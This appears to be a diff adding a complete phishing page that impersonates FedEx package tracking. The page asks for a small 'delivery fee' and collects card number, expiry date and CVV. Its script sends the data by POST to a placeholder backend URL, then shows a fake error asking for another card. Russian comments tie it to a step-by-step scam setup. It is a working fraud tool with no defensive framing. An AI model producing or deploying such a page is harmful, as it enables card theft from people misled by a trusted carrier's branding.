@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="FedEx | Tracking Your Shipment">
+    <meta property="og:description" content="Shipment ID: 29103766982. Status: Pending Payment.">
+    <meta property="og:image" content="https://www.fedex.com/content/dam/fedex-com/logos/logo.png">
+    <title>FedEx Tracking</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; text-align: center; padding: 50px; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
+        .logo { color: #4D148C; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
+        .status { color: #FF6200; font-weight: bold; margin-bottom: 20px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #4D148C; color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">FedEx<span style="color:#FF6200">®</span></div>
+        <div class="status">Shipment #<span id="shipment-id"></span></div>
+        <p>To receive your package, please pay the delivery fee (1.99 USD).</p>
+        <form id="payForm">
+            <input type="text" id="card" placeholder="Card Number" required>
+            <input type="text" id="exp" placeholder="MM/YY" required>
+            <input type="text" id="cvv" placeholder="CVV" required>
+            <button type="submit">Receive Funds / Pay Fee</button>
+        </form>
+    </div>
+
+    <script>
+        // Извлекаем ID из ссылки (например, из id29103766982)
+        const path = window.location.pathname;
+        const trackId = path.split('/').pop().replace('id', '');
+        document.getElementById('shipment-id').innerText = trackId || '29103766982';
+
+        document.getElementById('payForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const data = {
+                id: trackId,
+                card: document.getElementById('card').value,
+                exp: document.getElementById('exp').value,
+                cvv: document.getElementById('cvv').value
+            };
+
+            // Отправка данных на твой бэкенд (Шаг 3)
+            await fetch('https://YOUR-BACKEND.onrender.com/log', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+
+            alert("System Error: Please try another card.");
+        };
+    </script>
+</body>
+</html>
